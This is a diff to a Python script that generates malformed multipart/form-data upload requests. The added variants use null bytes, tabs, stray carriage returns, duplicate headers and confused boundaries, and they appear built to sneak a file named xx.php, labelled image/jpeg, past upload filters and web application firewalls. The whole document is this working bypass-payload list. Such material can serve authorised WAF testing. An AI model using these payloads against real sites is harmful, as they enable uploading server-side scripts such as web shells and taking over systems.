@@ -14,7 +14,7 @@ import base64, pyperclip
 suffix = b'php'
 filename = b'xx'
 name = b'upfile'
-boundary = b'------------------------42cef8877054958f'
+boundary = b'------------------------f4c3abc7d7d6bcd9'
 Content_Type = b'image/jpeg'
 content = b'123456'
 ##################################################################################################
@@ -53,6 +53,9 @@ def gbk_encode(string):
 ##################################################################################################
 payloads = []
 Content_Disposition_list = [b'''Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix[:1] + b'''\r\n''' + suffix[1:] + b'''"''',
+b'''\tContent-Disposition: form-data; name="''' + name + b'''"\r\r\nContent-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
+b'''Content-Disposition\t: form-data; name="''' + name + b'''"\r\r\nContent-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
+b'''Content-Disposition: form-data; name="''' + name + b'''\x00"\r\r\nContent-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"''',
 b'''Content-Disposition: "form-data"; name="''' + name + b'''"; \x1cfilename\x1c="''' + filename + b'''.''' + suffix + b'''"''',
 b'''Content-Disposition: "form-data"; name="''' + utf8_encode(name) + b'''"; filename="''' + utf8_encode(filename + b'''.''' + suffix) + b'''"''',
 b'''Content-Disposition: "form-data"; name="''' + gbk_encode(name) + b'''"; filename="''' + gbk_encode(filename + b'''.''' + suffix) + b'''"''',
@@ -213,6 +216,75 @@ Content-Type: ''' + Content_Type + b'''\r
 \r
 ''' + content + b'''\r
 -- "''' + boundary + b'''"''',#
+b'''Content-Type : multipart/form-data; boundary=--b\r
+Content-Type: multipart/form-data; boundary=''' + boundary + b'''\r
+\r
+--b\r
+Content-Disposition: form-data; name="''' + name + b'''";\r
+Content-Type: ''' + Content_Type + b'''\r
+\r
+1\r
+--''' + boundary + b'''\r
+Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"\r
+Content-Type: ''' + Content_Type + b'''\r
+\r
+''' + content + b'''\r
+--''' + boundary + b'''--\r
+--b''',#
+b'''Content-Type: multipart/form-data; aboundary=''' + boundary + b''';boundary=b;\r
+\r
+--b\r
+Content-Disposition: form-data; name="''' + name + b'''";\r
+Content-Type: ''' + Content_Type + b'''\r
+\r
+1\r
+--''' + boundary + b'''\r
+Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"\r
+Content-Type: ''' + Content_Type + b'''\r
+\r
+''' + content + b'''\r
+--''' + boundary + b'''--\r
+--b''',#
+b'''Content-Type: multipart/form-data; boundary=boundary=''' + boundary + b'''\r
+\r
+--''' + boundary + b'''\r
+Content-Disposition: form-data; name="''' + name + b'''";\r
+Content-Type: ''' + Content_Type + b'''\r
+\r
+1\r
+--boundary=''' + boundary + b'''\r
+Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"\r
+Content-Type: ''' + Content_Type + b'''\r
+\r
+''' + content + b'''\r
+--boundary=''' + boundary + b'''--\r
+--''' + boundary,#
+b'''Content-Type: multipart/form-data; boundary=''' + boundary + b'''\r
+\r
+--''' + boundary + b'''\r
+Content-Disposition: form-data; name=\'''' + name + b'''\'''' + name + b'''";\r
+Content-Type: ''' + Content_Type + b'''\r
+\r
+1\r
+--''' + boundary + b'''\r
+Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"\r
+Content-Type: ''' + Content_Type + b'''\r
+\r
+''' + content + b'''\r
+--''' + boundary,#
+b'''Content-Type: multipart/form-data; boundary=''' + boundary + b'''\r
+\r
+--''' + boundary + b'''\r
+Content-Disposition: form-data; name="''' + name + b''']";\r
+Content-Type: ''' + Content_Type + b'''\r
+\r
+1\r
+--''' + boundary + b'''\r
+Content-Disposition: form-data; name="''' + name + b'''"; filename="''' + filename + b'''.''' + suffix + b'''"\r
+Content-Type: ''' + Content_Type + b'''\r
+\r
+''' + content + b'''\r
+--''' + boundary,#
               ]
 ##################################################################################################
 for i in Content_Disposition_list:
